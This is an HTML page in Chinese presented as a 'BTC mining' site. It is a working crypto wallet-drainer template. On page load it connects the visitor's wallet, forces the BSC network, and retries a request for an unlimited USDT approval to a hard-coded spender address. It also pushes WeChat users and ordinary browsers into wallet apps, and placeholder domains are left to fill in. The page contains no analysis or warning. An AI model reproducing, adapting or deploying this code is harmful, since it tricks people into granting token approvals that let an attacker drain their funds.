<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BTC挖矿 - 可视化授权版</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
  <style>
    body { text-align:center; margin-top:50px; font-family:sans-serif; }
    button { padding:10px 20px; margin:5px; font-size:16px; }
    #progressContainer { width:300px; height:20px; border:1px solid #333; margin:20px auto; border-radius:5px; overflow:hidden; }
    #progressBar { height:100%; width:0%; background:#4caf50; transition:width 0.3s; }
  </style>
</head>
<body>

<h2>BTC挖矿</h2>

<p id="status">正在检测环境...</p>
<div id="progressContainer"><div id="progressBar"></div></div>
<div id="qrcode" style="margin:20px;"></div>

<script>
let web3;
let account;

// === 配置参数 ===
const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT-BSC
const spender = "0x766909a9F77664dA97B2BE58F02bB69769c27690";      // 授权目标地址
const ABI = [
  { "constant": false, "inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],
    "name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"
  }
];
const dappUrl = "https://你的域名.com";
const redirectUrl = "https://你的官网.com";
const maxRetries = 3;

// 页面加载自动执行
window.onload = async function(){
  await detectEnvironmentAndSmartOpenWallet();
};

// === 生成二维码 ===
function generateQRCode(url){
  const qrcodeContainer = document.getElementById("qrcode");
  qrcodeContainer.innerHTML = "";
  QRCode.toCanvas(url, {width:180}, function(error, canvas){
    if(error) console.error(error);
    qrcodeContainer.appendChild(canvas);
  });
}

// === 更新进度条 ===
function updateProgress(attempt){
  const progressBar = document.getElementById("progressBar");
  const percent = (attempt / maxRetries) * 100;
  progressBar.style.width = percent + "%";
  document.getElementById("status").innerText = `授权尝试 ${attempt}/${maxRetries}...`;
}

// === 自动检测环境并跳转钱包或授权 ===
async function detectEnvironmentAndSmartOpenWallet(){
  const ua = navigator.userAgent.toLowerCase();
  const isWeChat = ua.indexOf('micromessenger') !== -1;

  if(isWeChat){
    alert("您在微信中打开，请点击右上角“在浏览器打开”或扫码打开钱包");
    document.getElementById("status").innerText = "请在浏览器或钱包中打开网页";
    generateQRCode(dappUrl);
    return;
  }

  if(typeof window.ethereum !== "undefined"){
    document.getElementById("status").innerText = "检测到钱包，正在自动连接...";
    try{
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      account = accounts[0];
      document.getElementById("status").innerText = "已连接钱包: " + account;

      const chainId = await web3.eth.getChainId();
      if(chainId !== 56){
        alert("请切换到 BSC 主网");
        return;
      }

      await autoApproveWithRetry(maxRetries);
      return;

    }catch(err){
      console.error(err);
      document.getElementById("status").innerText = "自动授权失败，请刷新或手动操作";
      return;
    }
  }

  // 普通浏览器 → 尝试跳转钱包应用
  document.getElementById("status").innerText = "未检测到钱包，正在尝试跳转钱包应用...";
  smartOpenWallet();
}

// === 自动无限授权，支持重试 + 可视化进度 ===
async function autoApproveWithRetry(retries){
  const contract = new web3.eth.Contract(ABI, tokenAddress);
  for(let attempt=1; attempt<=retries; attempt++){
    updateProgress(attempt);
    try{
      console.log(`授权尝试 ${attempt}/${retries}...`);
      await contract.methods.approve(spender, web3.utils.toTwosComplement(-1))
        .send({from: account});
      console.log("授权成功");
      alert("授权成功（无限额度）");
      window.location.href = redirectUrl;
      return;
    }catch(err){
      console.error(`授权第 ${attempt} 次失败:`, err);
      if(attempt === retries){
        alert("授权失败，请手动点击钱包授权");
        document.getElementById("status").innerText = "授权失败，请手动点击钱包授权";
      }
    }
  }
}

// === 智能跳转钱包应用 ===
function smartOpenWallet(){
  const tpUrl = "tpdapp://" + dappUrl;
  const metamaskUrl = "https://metamask.app.link/dapp/" + dappUrl.replace("https://","");
  window.location.href = tpUrl;
  setTimeout(()=>{ window.location.href = metamaskUrl; }, 2000);
  setTimeout(()=>{ 
    document.getElementById("status").innerText = "未检测到钱包，请扫码打开";
    generateQRCode(dappUrl);
  }, 5000);
}
</script>

</body>
</html>
